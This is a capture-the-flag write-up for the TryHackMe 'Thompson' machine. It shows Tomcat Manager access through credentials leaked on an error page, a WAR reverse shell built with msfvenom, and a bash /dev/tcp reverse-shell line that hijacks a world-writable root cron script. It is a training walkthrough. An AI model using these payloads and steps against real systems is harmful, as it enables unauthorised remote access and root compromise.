# Thompson

boot2root machine for FIT and bsides guatemala CTF

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/Thompson.md

Room: https://tryhackme.com/room/bsidesgtthompson


## Initial Recon

We begin with a full port scan to understand the attack surface. At this stage we are not making assumptions — just collecting as much information as possible.

```bash
nmap -p- 10.49.146.112 -sC -sV
```

Full output:

```
Starting Nmap 7.80 ( https://nmap.org )
Host is up (0.00040s latency).
Not shown: 65532 closed ports

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)

8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request

8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/8.5.5

Service Info: OS: Linux
```

---

## Initial Analysis

From this scan we immediately identify three important services:

* SSH on 22 (likely not initial access path yet)
* AJP (Apache JServ) on 8009
* Apache Tomcat on 8080

### Why this matters

* **AJP (8009)** is typically *internal only* — seeing it exposed is a red flag
* **Tomcat (8080)** exposed directly means we can interact with the application server without a proxy

👉 At this point there are two viable paths:

1. Attack AJP (Ghostcat style)
2. Attack Tomcat web interface

We choose **web first** because it is usually faster and more visible.

---

## Web Enumeration

We manually check Tomcat endpoints:

```
http://10.49.146.112:8080/host-manager/html
http://10.49.146.112:8080/manager/html
```

These endpoints are commonly exposed in misconfigured Tomcat instances.

---

### Credential Testing

We test default credentials:

```
tomcat:tomcat
admin:admin
```

These fail — expected but always worth trying first.

---

## 401 Information Disclosure

Instead of brute forcing, we cancel authentication and observe the response.

This reveals a verbose error page:

```
You are not authorized to view this page.
please examine the file conf/tomcat-users.xml

Example:
<user username="tomcat" password="s3cret" roles="admin-gui"/>
```

---


## Gaining Access to Tomcat Manager

From the 401 response, we were given a clear hint:

```
<user username="tomcat" password="s3cret" roles="admin-gui"/>
```

Instead of guessing credentials blindly, we use this directly.

Attempt login with:

```
tomcat:s3cret
```

This successfully grants access to:

```
http://10.49.146.112:8080/manager/html
```

---

## Why this is critical

The Tomcat Manager interface allows:

* Uploading WAR files
* Deploying applications

👉 This is effectively **authenticated remote code execution**

No exploit needed — just functionality abuse.

---

## Exploitation — WAR Upload

### Step 1 — Start Listener

```bash
nc -lvnp 4444
```

We prepare to catch a reverse shell.

---

### Step 2 — Generate Payload

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.49.98.185 LPORT=4444 -f war -o shell.war
```

This creates a deployable Java web archive.

---

### Step 3 — Upload WAR

Upload `shell.war` via the Tomcat Manager interface.

Tomcat automatically deploys it as a web application.

---

### Step 4 — Trigger Payload

```
http://10.49.146.112:8080/shell/
```

Accessing this URL executes the payload.

---

## Shell Access

```
Connection received
whoami
tomcat
```

We now have a shell as the `tomcat` user.

---

## Shell Stabilisation

The initial shell is limited, so we upgrade it:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

This gives us a more interactive shell.

---

## Post Exploitation — Privilege Check

```bash
sudo -l
```

Output:

```
Sorry, try again.
```

👉 No sudo privileges — we must escalate another way.

---

## Enumeration — File System

We begin manual enumeration instead of immediately running tools.

```bash
cd /home
ls
```

```
jack
```

---

### Investigating /home/jack


### User Flag

```bash
cd /home/jack
cat user.txt
39400c90bc683################
```
---

## Privilege Escalation Discovery

We continue enumeration and carefully inspect files inside `/home/jack`.

```bash
tomcat@ubuntu:/home/jack$ ls -la
ls -la
total 48
drwxr-xr-x 4 jack jack 4096 Aug 23  2019 .
drwxr-xr-x 3 root root 4096 Aug 14  2019 ..
-rw------- 1 root root 1476 Aug 14  2019 .bash_history
-rw-r--r-- 1 jack jack  220 Aug 14  2019 .bash_logout
-rw-r--r-- 1 jack jack 3771 Aug 14  2019 .bashrc
drwx------ 2 jack jack 4096 Aug 14  2019 .cache
-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh
drwxrwxr-x 2 jack jack 4096 Aug 14  2019 .nano
-rw-r--r-- 1 jack jack  655 Aug 14  2019 .profile
-rw-r--r-- 1 jack jack    0 Aug 14  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root root   39 Apr 10 01:11 test.txt
-rw-rw-r-- 1 jack jack   33 Aug 14  2019 user.txt
-rw-r--r-- 1 root root  183 Aug 14  2019 .wget-hsts
```

We then inspect the id.sh script directly as it looks suspicious:

```bash
tomcat@ubuntu:/home/jack$ cat id.sh
cat id.sh
#!/bin/bash
id > test.txt
```

## Why this stands out

Two critical observations:

1. `id.sh` is **world-writable (777)**
2. `test.txt` is owned by **root**

---

### Inspect Script

```bash
cat id.sh
```

```
#!/bin/bash
id > test.txt
```

---

## Analysis

This tells us:

* The script runs `id`
* Output is written to a root-owned file

👉 This strongly implies:

> The script is executed by **root**, most likely via a cron job

We do not even need to confirm cron — behavior is enough.

---

## Exploitation — Script Hijack

We replace the script with a reverse shell:

```bash
echo 'bash -i >& /dev/tcp/10.49.98.185/5555 0>&1' > /home/jack/id.sh
```

---

## Listener

```bash
nc -lvnp 5555
```

---

## Root Shell

After waiting for execution (likely cron):

```
Connection received
root@ubuntu:/home/jack#
whoami
root
```

👉 Privilege escalation successful.

---

## Root Flag

```bash
cd /root
cat root.txt
d89d5391984c04################
```

---

# Key Takeaways

## AJP Exposure

* Port 8009 should not be public
* Strong indicator of misconfiguration

---

## Tomcat Manager

* Provides direct RCE via WAR upload
* No exploit required if credentials are valid

---

## Enumeration Wins

* No complex exploit needed
* Key was spotting `id.sh`

---

## Writable Script = Root

If a script is:

* Writable
* Executed by root

👉 You control root execution

---

# Attack Chain

```
Nmap → Tomcat → Manager → WAR → Shell → Writable Script → Root
```
